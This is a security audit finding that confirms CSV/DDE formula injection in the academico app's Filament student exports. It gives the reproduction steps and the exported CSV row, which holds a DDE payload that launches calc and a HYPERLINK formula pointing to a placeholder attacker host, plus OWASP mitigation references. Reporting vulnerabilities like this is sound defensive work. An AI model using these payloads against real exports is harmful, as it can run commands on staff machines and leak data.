# VULN-006 — CSV / DDE formula injection in Filament exports

**Target name:** academico
**Target URL:** https://github.com/academico-sis/academico
**Software version:** untagged, commit a6518355 (2026-05-31)
**Status**: CONFIRMED
**Severity (static)**: Medium (CVSS 6.1)
**Target commit**: a6518355c3a30818044c46a9fc7fd53da34ab7f7
**Validated at**: 2026-09-25

## Preconditions
- None to inject (public self-registration). A staff member must run the export and open the
  CSV in a spreadsheet app that evaluates formulas (the final client-side step; see below).
- Amplified by VULN-007 (skips any name-format constraint).

## Request
See `request.http`. (1) unauth registration with formula lastname + idnumber; (2) admin
`mountAction('export',{},{table:true})` + `callMountedAction` on `/admin/students`.

## Response
See `response.txt`. The generated export CSV row for the attacker:
```
"=cmd|'/c calc'!A0","=HYPERLINK(""HTTP://EVIL.TLD/A96D3EF9"",""CLICKME"")",Csva96D3Ef9,csv_a96d3ef9@example.invalid,"26 years old",
```
Both the `idnumber` cell (`=cmd|'/c calc'!A0`) and the `lastname` cell (`=HYPERLINK(...)`)
begin with `=` — no neutralization prefix (no leading `'`, space, or tab) was added.

## Observation
Matches the static finding. Filament's export writes each `ExportColumn` value straight into
the cell via the openspout CSV writer, which does no CSV-injection hardening. The name
accessors uppercase the value (`Str::upper`) but preserve the leading `=`, so the formula
survives. The file was read back from `storage/app/private/filament_exports/<id>/*.csv` inside
the container. The server-side defect (a live formula written unescaped) is confirmed;
whether the formula *executes* depends on the opener's spreadsheet (see below).

## Side effects
- Registered one `csv_<suffix>@example.invalid` student. Generated Filament export artifacts
  under `storage/app/private/filament_exports/` inside the container (harmless).

## Research & references
- OWASP — **CSV Injection** (Formula Injection): cells starting with `= + - @` (or tab/CR) are
  executed as formulas by Excel/LibreOffice; mitigate by prefixing with a single quote or by
  rejecting/escaping leading formula characters.
  https://owasp.org/www-community/attacks/CSV_Injection
- OWASP WSTG-**INPV-15** (Testing for CSV/Formula Injection).
- `=HYPERLINK`/`=WEBSERVICE` exfiltrate readily on click; `=cmd|'/c calc'!A0` DDE requires the
  spreadsheet's DDE/macro prompt to be accepted. This last, client-side execution step depends
  on the victim workstation and is not automatable server-side — it is the NEEDS_MANUAL portion
  called out in the writeup. The *injection* (unescaped formula in the export) is confirmed here.

## If FAILED
n/a — CONFIRMED (injection present; downstream execution is spreadsheet-dependent).
